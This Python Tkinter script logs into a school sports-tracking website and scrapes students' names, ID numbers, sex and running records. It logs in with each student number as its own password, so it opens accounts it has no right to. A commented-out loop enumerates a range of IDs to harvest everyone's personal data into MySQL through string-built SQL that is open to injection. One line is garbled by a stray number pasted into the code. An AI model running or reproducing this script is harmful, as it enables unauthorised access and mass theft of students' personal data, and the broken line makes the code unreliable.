from tkinter import *
import requests
from bs4 import BeautifulSoup
#import pymysql.cursors
headers = {'content-type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
session_requests = requests.session()


def login_website(username, password):
    # 登录信息
    payload = {'username': username, 'password': password}
    my_respone = session_requests.post('http://jhc.sunnysport.org.cn/login/',
                                       data=payload,
                                       allow_redirects=False,
                                       verify=False,
                                       headers=headers)
    # 获取sessionid值
    c = my_respone.headers.get('Set-Cookie')
    index = c.index(';')
    c = c[0:index]
    index2 = c.index('=')
    cookeis = {'sessionid': c[index2 + 1:]}
    r = session_requests.post('http://jhc.sunnysport.org.cn//runner/index.html', cookies=cookeis,
                              headers=headers)
    # 得到相应的数据信息
    get_user_info(r.text)
    return r.text


def get_user_info(r):
    soup = BeautifulSoup(r, "html.parser")
    body = soup.body
    #print(soup)
    # 这里要分离出用户的姓名和性别
    human = soup.select('div.thumbnail')
    r = human[0]
    name = r.find_all('label')[1].text  #获取姓名
    sid = r.find_all('label')[2].text   #获取学号
    sex = r.find_all('label')[3].text  #获取性别
    # 这里分离出相应的用户详情信息
    details = soup.select('table')
    table1 = details[0]
    sum_road = table1.find_all('td')[1].text
    avg_speed = table1.find_all('td')[3].text201637011580075
    valid = table1.find_all('td')[5].text
    # 包含分组 最低速度 最低里程
    table2 = details[1]
    group = table2.find_all('td')[1]
    low_speed = table2.find_all('td')[3].text.encode('utf-8')[0:table2.find_all('td')[3].text.index('m/s')]
    low_road = table2.find_all('td')[5].text.encode('utf-8')[0:table2.find_all('td')[5].text.index('m')]
    a =[name, sid, sex, sum_road, avg_speed, valid, group, low_speed, low_road]
    #print(a)
    return a
'''
def save(data1):
    connect = pymysql.connect(host='127.0.0.1', port=3306, user='root', passwd='root', db='python',charset='utf8')
# Cursor 对象
    cursor = connect.cursor()
    # 插入数据
    sql = "INSERT INTO sunnyRun (id, name, sex,总米数,平均速度,次数) VALUES ( '%s', '%s', '%s', '%s', '%s', '%s' )"
    data = (data1[1], data1[0], data1[2],data1[3],data1[4],data1[5])
    cursor.execute(sql % data)
    connect.commit()
    print('成功插入', cursor.rowcount, '条数据')
    cursor.close()
    connect.close()


def manytime():
    x = 201600000000000
    while x < 201699999999999:
        try:
            a = login_website(x, x)
            b = get_user_info(a)
            #print(b)
            save(b)
            x= x+1
        except :
            print("已经改密码了")
            x= x+2
manytime()
'''
def go_to_website(num):
    login = login_website(num,num)
    data = get_user_info(login)
    myEntry2.delete(0, END)
    myEntry3.delete(0, END)
    myEntry4.delete(0, END)
    myEntry5.delete(0, END)
    myEntry6.delete(0, END)
    myEntry2.insert(0, data[0])
    myEntry3.insert(0, data[2])
    myEntry4.insert(0, data[3])
    try:
        myEntry5.insert(0, data[4])
    except:
        myEntry5.insert(0, "今天没有跑过哦")
    myEntry6.insert(0, data[5])


    #print(data)

def get_student_num():
    student_num = Entry.get(myEntry)
    go_to_website(student_num)


master = Tk()
var = IntVar()

Label(master, text="学号").grid(sticky=E)
Label(master, text="密码").grid(sticky=E)
Label(master, text="姓名").grid(sticky=E)
Label(master, text="性别").grid(sticky=E)
Label(master, text="总路程").grid(sticky=E)
Label(master, text="平均速度").grid(sticky=E)
Label(master, text="有效次数").grid(sticky=E)

myEntry = Entry(master)
myEntry1 = Entry(master)
myEntry2 = Entry(master)
myEntry3 = Entry(master)
myEntry4 = Entry(master)
myEntry5 = Entry(master)
myEntry6 = Entry(master)


myEntry.grid(row=0, column=1)
myEntry1.grid(row=1, column=1)
myEntry2.grid(row=2, column=1)
myEntry3.grid(row=3, column=1)
myEntry4.grid(row=4, column=1)
myEntry5.grid(row=5, column=1)
myEntry6.grid(row=6, column=1)

button1 = Button(master, text='Zoom in', command=get_student_num)
button1.grid(row=2, column=2)

mainloop()


